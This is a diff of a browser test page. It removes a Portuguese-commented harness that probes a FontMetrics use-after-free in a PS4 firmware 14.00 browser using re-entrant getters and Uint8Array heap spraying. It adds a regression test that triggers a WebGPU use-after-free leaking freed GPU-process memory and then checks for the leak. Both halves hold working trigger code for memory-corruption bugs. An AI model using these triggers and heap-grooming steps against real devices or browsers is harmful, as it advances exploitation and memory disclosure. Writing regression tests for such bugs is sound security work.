@@ -1,491 +1,236 @@
 
-<!DOCTYPE html>
-<pre id="log"></pre>
 <script>
-// DIAGNOSTICO FontMetrics UAF (rdar://187946124) — PS4 FW 14.00
-//
-// Objetivo: encontrar condicoes que tornem o UAF detectavel no main thread.
-//
-// Estrutura:
-//   SECAO A — deteccao de sincronicidade do getter
-//   SECAO B — tentativas de UAF com TextMetrics anomalos
-//   SECAO C — ancora de crash conhecida (42b1e2a)
-//
-// Metricas "normais" esperadas com Ahem 10px: ascent ~8-11, descent ~0-2
-// Sinal de UAF: NaN | 0 | valores absurdos | divergencia entre attempts
+    
+    const log = console.debug;
 
-var out = document.getElementById('log');
-var buf = '';
-function log(s) { buf += s + '\n'; out.textContent = buf; }
+    // Use-after-free read of a buffer snapshot in Buffer's slow index validation
+    // paths.
+    //
+    // Submitting a draw whose index validation was served from the cache, after the
+    // data that validation covered has since changed, sends Buffer down a slow path:
+    // it re-verifies the indices, and when that fails it snapshots the whole buffer
+    // into a Vector, clears the buffer, and restores the snapshot from a post-commit
+    // handler. That handler -- and with it the snapshot -- is destroyed the moment it
+    // returns, because CommandBuffer::postCommitHandler() clears m_postCommitHandlers
+    // right after invoking them.
+    //
+    // At or above WGPU_LARGE_BUFFER_SIZE the restoring writeBuffer() stages the copy
+    // through a newBufferWithBytesNoCopy MTLBuffer, which only aliases the snapshot's
+    // bytes (Device::newBufferWithBytesNoCopy passes deallocator:nil), and the staging
+    // command buffer is committed without waiting on it. So the GPU read the snapshot
+    // after it had been freed, copying whatever the allocator had since put in those
+    // 32 MiB into a buffer this page can read back -- an uncompromised web process
+    // reading freed GPU process memory.
+    //
+    // The fix hands the snapshot to the queue by value, which keeps it alive in an
+    // addCompletedHandler on the staging command buffer until the GPU is done with it.
+    // The restored buffer must then hold exactly what the snapshot held. Any other
+    // value came from freed heap.
+    //
+    // Two paths snapshot a buffer this way, and both are covered here:
+    //   1. Buffer::takeSlowIndexValidationPath, reached by drawIndexed, snapshots the
+    //      index buffer.
+    //   2. Buffer::takeSlowIndirectIndexValidationPath, reached by drawIndexedIndirect,
+    //      snapshots the indirect buffer. Nothing bounds an indirect buffer's size
+    //      below maxBufferSize, so a page-sized indirect buffer reaches the same
+    //      noCopy staging path even though the arguments it holds are 20 bytes.
 
-var uid = 0;
-var dummyId = 0;
-var alive = [];
+    // Exactly WGPU_LARGE_BUFFER_SIZE, so the restore takes the noCopy path.
+    const SIZE = 32 * 1024 * 1024;
 
-function fontUrl(d) { return 'url("' + d + '")'; }
+    const POISON = 0xFFFFFFFF;
 
-function addDummies(n) {
-    for (var i = 0; i < n; i++) {
-        var d = document.createElement('canvas');
-        d.width = 1; d.height = 1;
-        d.getContext('2d').font = '10px "Z' + (dummyId++) + '"';
-        alive.push(d);
-    }
-}
+    // indexCount, instanceCount, firstIndex, baseVertex, firstInstance.
+    const INDIRECT_ARGS = new Uint32Array([3, 1, 0, 0, 0]);
 
-function makeCtx(fontStr) {
-    var c = document.createElement('canvas');
-    c.width = 64; c.height = 64;
-    c.style.cssText = 'position:absolute;left:-9999px';
-    document.body.appendChild(c);
-    var ctx = c.getContext('2d');
-    ctx.font = fontStr;
-    alive.push(c, ctx);
-    return ctx;
-}
+    const WGSL = `
+@vertex fn vs(@location(0) pos: vec4f) -> @builtin(position) vec4f { return pos; }
+@fragment fn fs() -> @location(0) vec4f { return vec4f(1.0); }
+`;
 
-function metricsStr(m) {
-    return 'w=' + m.width +
-           ' ascent=' + m.actualBoundingBoxAscent +
-           ' descent=' + m.actualBoundingBoxDescent +
-           ' fontBB_asc=' + m.fontBoundingBoxAscent +
-           ' fontBB_desc=' + m.fontBoundingBoxDescent +
-           ' em_asc=' + m.emHeightAscent +
-           ' em_desc=' + m.emHeightDescent;
-}
-
-fetch('resources/Ahem.woff')
-    .then(function(r) { return r.arrayBuffer(); })
-    .then(function(b) {
-        return new Promise(function(res, rej) {
-            var fr = new FileReader();
-            fr.onload  = function(e) { res(e.target.result); };
-            fr.onerror = rej;
-            fr.readAsDataURL(new Blob([b], { type: 'font/woff' }));
+    // Copies the buffer into a mappable one and looks for evidence of freed heap.
+    // Words listed in expected must hold the given value; every other word must be
+    // zero, since that is all the snapshot ever held.
+    async function inspectRestoredBuffer(device, queue, buffer, expected) {
+        const staging = device.createBuffer({
+            size: SIZE, usage: GPUBufferUsage.MAP_READ | GPUBufferUsage.COPY_DST,
         });
-    })
-    .then(function(dataUrl) {
+        const readbackEncoder = device.createCommandEncoder();
+        readbackEncoder.copyBufferToBuffer(buffer, 0, staging, 0, SIZE);
+        queue.submit([readbackEncoder.finish()]);
+        await queue.onSubmittedWorkDone();
 
-    // =====================================================================
-    // SECAO A — deteccao de sincronicidade
-    // =====================================================================
-    // A1: Times(primary) + Ahem(fallback) + Cherokee
-    //     Este e o setup que a 42b1e2a usa com fallback — deve ser SINCRONO
-    // =====================================================================
-    var tests = [
-
-    {
-        id: 'A1',
-        name: 'SYNC? Times(primary) + Ahem(fallback) + Cherokee U+13A0',
-        info: 'Verifica se getter dispara DENTRO de measureText() neste setup',
-        dummies: 0,
-        crashExpected: false,
-        run: function(done) {
-            var id = uid++;
-            var face = new FontFace('AF' + id, fontUrl(dataUrl));
-            document.fonts.add(face);
-            void face.loaded;
-            alive.push(face);
-
-            var ctx = makeCtx('10px Times, AF' + id);
-
-            var firedSync = false;
-            Object.defineProperty(face, 'then', {
-                configurable: true,
-                get: function() { firedSync = true; }
-            });
-
-            ctx.measureText('\u13A0\u13A2\u13A4');
-
-            if (firedSync) {
-                log('  -> SINCRONO: getter disparou DENTRO de measureText()');
-                log('  -> FontMetrics UAF e potencialmente atingivel neste setup');
-            } else {
-                // verificar microtask
-                Promise.resolve().then(function() {
-                    if (firedSync) {
-                        log('  -> MICROTASK: getter disparou APOS measureText() (async)');
-                        log('  -> Setup Times+fallback+Cherokee tem comportamento async');
-                    } else {
-                        log('  -> NAO DISPAROU: getter nao foi acessado em nenhum momento');
-                    }
-                    done();
-                });
-                return; // done sera chamado dentro do Promise
+        await staging.mapAsync(GPUMapMode.READ);
+        const words = new Uint32Array(staging.getMappedRange());
+        let leakedIndex = -1;
+        let leakedValue = 0;
+        let matchedWords = 0;
+        for (let i = 0; i < words.length; ++i) {
+            const word = words[i];
+            const want = expected.get(i);
+            if (want !== undefined) {
+                if (word === want)
+                    ++matchedWords;
+                continue;
             }
-            done();
+            if (!word || leakedIndex >= 0)
+                continue;
+            leakedIndex = i;
+            leakedValue = word;
         }
-    },
+        // getMappedRange() is detached by unmap(), so report from the locals.
+        staging.unmap();
+        staging.destroy();
 
-    // =====================================================================
-    // A2: Ahem(primary) + Latin 'a' — controle, esperado async (como diagnostico)
-    // =====================================================================
-    {
-        id: 'A2',
-        name: 'SYNC? Ahem(primary) + Latin "a" [controle]',
-        info: 'Esperado: async (confirmado no diagnostico anterior)',
-        dummies: 0,
-        crashExpected: false,
-        run: function(done) {
-            var id = uid++;
-            var face = new FontFace('AF' + id, fontUrl(dataUrl));
-            document.fonts.add(face);
-            void face.loaded;
-            alive.push(face);
-
-            var ctx = makeCtx('10px AF' + id);
-            var firedSync = false;
-            Object.defineProperty(face, 'then', {
-                configurable: true,
-                get: function() { firedSync = true; }
-            });
-
-            ctx.measureText('a');
-
-            Promise.resolve().then(function() {
-                log('  -> ' + (firedSync ? 'ASYNC (apos measureText)' : 'NAO DISPAROU'));
-                done();
-            });
-        }
-    },
-
-    // =====================================================================
-    // B1: FontMetrics UAF — Times+Ahem+Cherokee + fonts.add() + 1200 dummies
-    //     Se sync (A1 confirmou): fontMetrics deveria ser liberado durante width()
-    //     UAF read -> valores de TextMetrics possivelmente anomalos
-    // =====================================================================
-    {
-        id: 'B1',
-        name: 'UAF B1: Times+Ahem+Cherokee + fonts.add() + 1200 dummies',
-        info: 'FontMetrics UAF basico — valores anomalos indicam UAF',
-        dummies: 1200,
-        crashExpected: false,
-        run: function(done) {
-            for (var attempt = 0; attempt < 2; attempt++) {
-                var id = uid++;
-                var face = new FontFace('BF' + id, fontUrl(dataUrl));
-                document.fonts.add(face);
-                void face.loaded;
-                alive.push(face);
-
-                var ctx = makeCtx('10px Times, BF' + id);
-                var reent = false;
-                Object.defineProperty(face, 'then', {
-                    configurable: true,
-                    get: function() {
-                        if (reent) return undefined;
-                        reent = true;
-                        document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
-                        reent = false;
-                    }
-                });
-
-                var m = ctx.measureText('\u13A0\u13A2\u13A4');
-                log('  attempt ' + attempt + ': ' + metricsStr(m));
-            }
-            done();
-        }
-    },
-
-    // =====================================================================
-    // B2: Mesmo que B1 mas com 3500 dummies (numero do PoC original)
-    // =====================================================================
-    {
-        id: 'B2',
-        name: 'UAF B2: Times+Ahem+Cherokee + fonts.add() + 3500 dummies',
-        info: 'Mais dummies = maior chance de pruneUnreferencedEntries liberar durante width()',
-        dummies: 3500,
-        crashExpected: false,
-        run: function(done) {
-            for (var attempt = 0; attempt < 2; attempt++) {
-                var id = uid++;
-                var face = new FontFace('BF' + id, fontUrl(dataUrl));
-                document.fonts.add(face);
-                void face.loaded;
-                alive.push(face);
-
-                var ctx = makeCtx('10px Times, BF' + id);
-                var reent = false;
-                Object.defineProperty(face, 'then', {
-                    configurable: true,
-                    get: function() {
-                        if (reent) return undefined;
-                        reent = true;
-                        document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
-                        reent = false;
-                    }
-                });
-
-                var m = ctx.measureText('\u13A0\u13A2\u13A4');
-                log('  attempt ' + attempt + ': ' + metricsStr(m));
-            }
-            done();
-        }
-    },
-
-    // =====================================================================
-    // B3: Pressao de heap dentro do getter
-    //     Apos liberar FontCascadeFonts (via fonts.add()), criar muitos
-    //     Uint8Array para tentar reutilizar o slot de memoria liberado.
-    //     Se o slot for reutilizado: fontMetrics.ascent() retorna bytes do
-    //     Uint8Array (provavelmente 0) -> valor anomalo detectavel.
-    // =====================================================================
-    {
-        id: 'B3',
-        name: 'UAF B3: B1 + pressao de heap (Uint8Array) dentro do getter',
-        info: 'Tenta forcar reutilizacao da memoria liberada do FontCascadeFonts',
-        dummies: 1200,
-        crashExpected: false,
-        run: function(done) {
-            for (var attempt = 0; attempt < 2; attempt++) {
-                var id = uid++;
-                var face = new FontFace('BF' + id, fontUrl(dataUrl));
-                document.fonts.add(face);
-                void face.loaded;
-                alive.push(face);
-
-                var ctx = makeCtx('10px Times, BF' + id);
-                var reent = false;
-                var pressure = [];
-                Object.defineProperty(face, 'then', {
-                    configurable: true,
-                    get: function() {
-                        if (reent) return undefined;
-                        reent = true;
-                        // Invalidar FontCascadeFonts
-                        document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
-                        // Pressao de heap: muitos blocos pequenos para
-                        // tentar reusar o slot liberado do FontCascadeFonts
-                        // FontCascadeFonts tem tipicamente algumas centenas de bytes
-                        for (var j = 0; j < 500; j++) {
-                            pressure.push(new Uint8Array(256));
-                        }
-                        reent = false;
-                    }
-                });
-
-                var m = ctx.measureText('\u13A0\u13A2\u13A4');
-                log('  attempt ' + attempt + ': ' + metricsStr(m));
-            }
-            done();
-        }
-    },
-
-    // =====================================================================
-    // B4: document.body.offsetTop dentro do getter (sugestao do usuario)
-    //     Forca layout sincrono durante a execucao do getter.
-    //     Objetivo: o layout pode causar operacoes adicionais no FontCascadeCache
-    //     que acelerem a liberacao do FontCascadeFonts ou causem sua reutilizacao.
-    // =====================================================================
-    {
-        id: 'B4',
-        name: 'UAF B4: B1 + document.body.offsetTop dentro do getter',
-        info: 'Layout forcado pode acelerar FontCascadeCache churn durante o getter',
-        dummies: 1200,
-        crashExpected: false,
-        run: function(done) {
-            // Adicionar texto no DOM usando a fonte para que o layout
-            // realmente precise calcular metricas de texto com ela
-            var domText = document.createElement('p');
-            domText.style.cssText = 'position:absolute;left:-9999px;font:10px "Times"';
-            domText.textContent = '\u13A0\u13A2\u13A4';
-            document.body.appendChild(domText);
-            alive.push(domText);
-
-            for (var attempt = 0; attempt < 2; attempt++) {
-                var id = uid++;
-                var face = new FontFace('BF' + id, fontUrl(dataUrl));
-                document.fonts.add(face);
-                void face.loaded;
-                alive.push(face);
-
-                var ctx = makeCtx('10px Times, BF' + id);
-                var reent = false;
-                Object.defineProperty(face, 'then', {
-                    configurable: true,
-                    get: function() {
-                        if (reent) return undefined;
-                        reent = true;
-                        document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
-                        // Layout forcado: pode interagir com FontCascadeCache
-                        void document.body.offsetTop;
-                        reent = false;
-                    }
-                });
-
-                var m = ctx.measureText('\u13A0\u13A2\u13A4');
-                log('  attempt ' + attempt + ': ' + metricsStr(m));
-            }
-            done();
-        }
-    },
-
-    // =====================================================================
-    // B5: fonts.add() multiplos dentro do getter
-    //     Mais invalidacoes = mais chances de FontCascadeCache ser consultado
-    //     e pruneUnreferencedEntries disparar DURANTE o glyph walk
-    // =====================================================================
-    {
-        id: 'B5',
-        name: 'UAF B5: B1 + fonts.add() x10 no getter (mais invalidacoes)',
-        info: 'Multiplas invalidacoes tentam forcar FontCascadeCache::get() durante width()',
-        dummies: 1200,
-        crashExpected: false,
-        run: function(done) {
-            for (var attempt = 0; attempt < 2; attempt++) {
-                var id = uid++;
-                var face = new FontFace('BF' + id, fontUrl(dataUrl));
-                document.fonts.add(face);
-                void face.loaded;
-                alive.push(face);
-
-                var ctx = makeCtx('10px Times, BF' + id);
-                var reent = false;
-                Object.defineProperty(face, 'then', {
-                    configurable: true,
-                    get: function() {
-                        if (reent) return undefined;
-                        reent = true;
-                        for (var k = 0; k < 10; k++) {
-                            document.fonts.add(
-                                new FontFace('U' + (uid++), 'local("x")')
-                            );
-                        }
-                        reent = false;
-                    }
-                });
-
-                var m = ctx.measureText('\u13A0\u13A2\u13A4');
-                log('  attempt ' + attempt + ': ' + metricsStr(m));
-            }
-            done();
-        }
-    },
-
-    // =====================================================================
-    // B6: Texto longo com muitos caracteres Cherokee
-    //     Mais iteracoes no WidthIterator = mais chamadas a glyphDataForVariant
-    //     = mais oportunidades para FontCascadeCache::get() com nova versao
-    //     = mais chances de pruneUnreferencedEntries() disparar durante width()
-    // =====================================================================
-    {
-        id: 'B6',
-        name: 'UAF B6: B3 + texto Cherokee longo (100 chars)',
-        info: 'Mais iteracoes WidthIterator = mais oportunidades para pruning em width()',
-        dummies: 1200,
-        crashExpected: false,
-        run: function(done) {
-            var longText = '';
-            for (var c = 0; c < 100; c++) {
-                longText += String.fromCharCode(0x13A0 + (c % 40));
-            }
-
-            for (var attempt = 0; attempt < 2; attempt++) {
-                var id = uid++;
-                var face = new FontFace('BF' + id, fontUrl(dataUrl));
-                document.fonts.add(face);
-                void face.loaded;
-                alive.push(face);
-
-                var ctx = makeCtx('10px Times, BF' + id);
-                var reent = false;
-                var pressure = [];
-                Object.defineProperty(face, 'then', {
-                    configurable: true,
-                    get: function() {
-                        if (reent) return undefined;
-                        reent = true;
-                        document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
-                        for (var j = 0; j < 500; j++) {
-                            pressure.push(new Uint8Array(256));
-                        }
-                        reent = false;
-                    }
-                });
-
-                var m = ctx.measureText(longText);
-                log('  attempt ' + attempt + ': ' + metricsStr(m));
-            }
-            done();
-        }
-    },
-
-    // =====================================================================
-    // C1: ANCORA — padrao 42b1e2a [CRASH ESPERADO]
-    //     Se nenhum B causou crash, este deve crashar como referencia.
-    // =====================================================================
-    {
-        id: 'C1',
-        name: '2 faces MESMA familia + 0 dummies [CRASH ESPERADO — ancora]',
-        info: 'Padrao original 42b1e2a confirmado. Valida que a sessao ainda funciona.',
-        dummies: 0,
-        crashExpected: true,
-        run: function(done) {
-            var id = uid++;
-            var f1 = new FontFace('CF' + id, fontUrl(dataUrl));
-            var f2 = new FontFace('CF' + id, fontUrl(dataUrl));
-            document.fonts.add(f1);
-            document.fonts.add(f2);
-            void f1.loaded; void f2.loaded;
-            alive.push(f1, f2);
-
-            var trap = function() {
-                document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
-            };
-            Object.defineProperty(f1, 'then', { get: trap });
-            Object.defineProperty(f2, 'then', { get: trap });
-
-            var ctx = makeCtx('10px Times, CF' + id);
-            ctx.measureText('\u13A0\u13A2\u13A4');
-            done();
-        }
+        return { leakedIndex, leakedValue, matchedWords };
     }
 
-    ]; // fim tests
-
-    // =====================================================================
-    // Runner sequencial
-    // =====================================================================
-    var idx = 0;
-    function next() {
-        if (idx >= tests.length) {
-            log('\n=== TODOS OS TESTES CONCLUIDOS SEM CRASH ===');
-            return;
-        }
-        var t = tests[idx++];
-        var crashTag = t.crashExpected ? ' [CRASH ESPERADO]' : '';
-        log('--- ' + t.id + ': ' + t.name + crashTag);
-        log('    ' + t.info);
-
-        setTimeout(function() {
-            if (t.dummies > 0) {
-                log('    Adicionando ' + t.dummies + ' dummies (total acumulado: ~' + dummyId + ')...');
-            }
-            addDummies(t.dummies);
-
-            log('    [EXECUTANDO] <<<');
-            setTimeout(function() {
-                var isDone = false;
-                var doneCb = function() {
-                    if (!isDone) {
-                        isDone = true;
-                        log('    PASSOU\n');
-                        next();
-                    }
-                };
-                t.run(doneCb);
-                // fallback se run() nao chamar done()
-                // (casos sync chamam done() diretamente)
-            }, 200);
-        }, 150);
+    function report(what, expected, { leakedIndex, leakedValue, matchedWords }) {
+        if (leakedIndex >= 0)
+            log(`FAIL: freed heap read back from ${what} at word ${leakedIndex} (0x${leakedValue.toString(16)})`);
+        else if (matchedWords !== expected.size)
+            log(`FAIL: expected ${expected.size} preserved words in ${what}, got ${matchedWords}`);
+        else
+            log(`PASS: ${what} restored to exactly the snapshotted contents`);
     }
 
-    log('=== DIAGNOSTICO FontMetrics UAF — PS4 FW 14.00 ===');
-    log('Ahem.woff OK. Metricas normais: ascent ~8, fontBB ~11, descent ~0-2');
-    log('Sinal de UAF: valores 0, NaN, negativos, absurdos ou divergentes\n');
-    next();
+    // Buffer::takeSlowIndexValidationPath: the index buffer is the one snapshotted.
+    async function testDrawIndexed(device, queue, pipeline, vertexBuffer, renderTarget) {
+        const indexBuffer = device.createBuffer({
+            size: SIZE,
+            usage: GPUBufferUsage.INDEX | GPUBufferUsage.COPY_DST | GPUBufferUsage.COPY_SRC,
+        });
 
-}).catch(function(e) {
-    document.getElementById('log').textContent = 'ERRO: ' + e.message;
-});
+        function recordDrawIndexed() {
+            const enc = device.createCommandEncoder();
+            const pass = enc.beginRenderPass({ colorAttachments: [{
+                view: renderTarget.createView(),
+                loadOp: 'clear', storeOp: 'store',
+            }]});
+            pass.setPipeline(pipeline);
+            pass.setVertexBuffer(0, vertexBuffer);
+            pass.setIndexBuffer(indexBuffer, 'uint32');
+            pass.drawIndexed(3, 1, 0, 0, 0);
+            pass.end();
+            return enc.finish();
+        }
+
+        // Seed the drawIndexed validation cache with in-range indices.
+        queue.writeBuffer(indexBuffer, 0, new Uint32Array([0, 1, 2]));
+        queue.submit([recordDrawIndexed()]);
+        await queue.onSubmittedWorkDone();
+
+        // Record an identical drawIndexed, which now hits that cache.
+        const cacheHit = recordDrawIndexed();
+
+        // Poison the indices, setting m_mustTakeSlowIndexValidationPath.
+        queue.writeBuffer(indexBuffer, 0, new Uint32Array([POISON, POISON, POISON]));
+        await queue.onSubmittedWorkDone();
+
+        // Submitting the cache hit now snapshots, clears and restores.
+        queue.submit([cacheHit]);
+        await queue.onSubmittedWorkDone();
+
+        const expected = new Map([[0, POISON], [1, POISON], [2, POISON]]);
+        report('index buffer', expected, await inspectRestoredBuffer(device, queue, indexBuffer, expected));
+        indexBuffer.destroy();
+    }
+
+    // Buffer::takeSlowIndirectIndexValidationPath: the indirect buffer is the one
+    // snapshotted, and its size is the page's to choose.
+    async function testDrawIndexedIndirect(device, queue, pipeline, vertexBuffer, renderTarget) {
+        // INDEX is in the usage only to pin the storage mode: without unified memory
+        // storageMode() gives an INDIRECT | COPY_DST buffer MTLStorageModePrivate,
+        // whose contents are unreachable from the CPU, so the snapshot this test is
+        // about is never taken there.
+        const indirectBuffer = device.createBuffer({
+            size: SIZE,
+            usage: GPUBufferUsage.INDIRECT | GPUBufferUsage.INDEX
+                | GPUBufferUsage.COPY_DST | GPUBufferUsage.COPY_SRC,
+        });
+        const indexBuffer = device.createBuffer({
+            size: 16, usage: GPUBufferUsage.INDEX | GPUBufferUsage.COPY_DST,
+        });
+
+        function recordDrawIndexedIndirect() {
+            const enc = device.createCommandEncoder();
+            const pass = enc.beginRenderPass({ colorAttachments: [{
+                view: renderTarget.createView(),
+                loadOp: 'clear', storeOp: 'store',
+            }]});
+            pass.setPipeline(pipeline);
+            pass.setVertexBuffer(0, vertexBuffer);
+            pass.setIndexBuffer(indexBuffer, 'uint32');
+            pass.drawIndexedIndirect(indirectBuffer, 0);
+            pass.end();
+            return enc.finish();
+        }
+
+        // Seed the indirect argument cache with in-range indices.
+        queue.writeBuffer(indexBuffer, 0, new Uint32Array([0, 1, 2]));
+        queue.writeBuffer(indirectBuffer, 0, INDIRECT_ARGS);
+        queue.submit([recordDrawIndexedIndirect()]);
+        await queue.onSubmittedWorkDone();
+
+        // Record an identical drawIndexedIndirect, which now hits that cache and so
+        // defers its validation to commit time.
+        const cacheHit = recordDrawIndexedIndirect();
+
+        // Poison the indices the cached arguments point at, so the commit-time
+        // re-verification of those arguments fails.
+        queue.writeBuffer(indexBuffer, 0, new Uint32Array([POISON, POISON, POISON]));
+        await queue.onSubmittedWorkDone();
+
+        // Rewriting the arguments invalidates the indirect cache, which is what sends
+        // the commit handler down the slow path.
+        queue.writeBuffer(indirectBuffer, 0, INDIRECT_ARGS);
+        await queue.onSubmittedWorkDone();
+
+        // Submitting the cache hit now snapshots, clears and restores.
+        queue.submit([cacheHit]);
+        await queue.onSubmittedWorkDone();
+
+        // The snapshot held the arguments and nothing else.
+        const expected = new Map([[0, INDIRECT_ARGS[0]], [1, INDIRECT_ARGS[1]]]);
+        report('indirect buffer', expected, await inspectRestoredBuffer(device, queue, indirectBuffer, expected));
+        indirectBuffer.destroy();
+        indexBuffer.destroy();
+    }
+
+    async function main() {
+        try {
+            const adapter = await navigator.gpu.requestAdapter({});
+            const device  = await adapter.requestDevice({});
+            const queue   = device.queue;
+
+            const vertexBuffer = device.createBuffer({
+                size: 3 * 16, usage: GPUBufferUsage.VERTEX,
+            });
+            const renderTarget = device.createTexture({
+                size: [4, 4], format: 'rgba8unorm',
+                usage: GPUTextureUsage.RENDER_ATTACHMENT,
+            });
+
+            const module = device.createShaderModule({ code: WGSL });
+            const pipeline = device.createRenderPipeline({
+                layout: 'auto',
+                vertex: {
+                    module,
+                    buffers: [{
+                        arrayStride: 16,
+                        attributes: [{ shaderLocation: 0, offset: 0, format: 'float32x4' }],
+                    }],
+                },
+                fragment: { module, targets: [{ format: 'rgba8unorm' }] },
+            });
+
+            await testDrawIndexed(device, queue, pipeline, vertexBuffer, renderTarget);
+            await testDrawIndexedIndirect(device, queue, pipeline, vertexBuffer, renderTarget);
+        } catch (e) {
+            log('FAIL: exception: ' + e);
+        }
+        
+    }
+
+    onload = main;
 </script>
